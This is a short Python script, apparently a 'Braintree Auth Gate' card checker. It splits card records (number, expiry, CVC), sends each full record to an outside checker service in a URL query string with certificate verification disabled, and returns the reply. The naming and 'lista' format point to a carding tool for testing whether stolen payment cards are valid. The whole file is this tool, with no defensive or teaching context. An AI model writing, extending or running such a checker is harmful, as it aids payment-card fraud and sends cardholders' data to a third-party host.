import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def Tele(ccx):
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")

    if "20" in yy:
        yy = yy.split("20")[1]

    response = requests.get(f'https://bot.naja-chk.site/api.php?lista={n}|{mm}|{yy}|{cvc}', verify=False)
    try:
        result2 = response.text
    except Exception as e:
        result2 = str(e)
    
    return result2

print("Braintree Auth Gate Is Working ✅")
